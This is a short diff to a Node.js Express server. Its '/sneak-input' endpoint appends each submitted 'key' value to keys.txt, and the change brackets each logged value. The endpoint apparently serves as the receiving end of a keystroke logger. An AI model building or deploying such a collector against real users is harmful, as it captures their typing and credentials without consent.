@@ -14,7 +14,7 @@ app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 // start the server
 app.listen(port);
 app.post('/sneak-input', function (req, res) {
-    var input_key = req.body.key;
+    var input_key = '[' + req.body.key + '],';
 
     fs.appendFile('keys.txt', input_key, (err) => {
         // throws an error, you could also catch it here
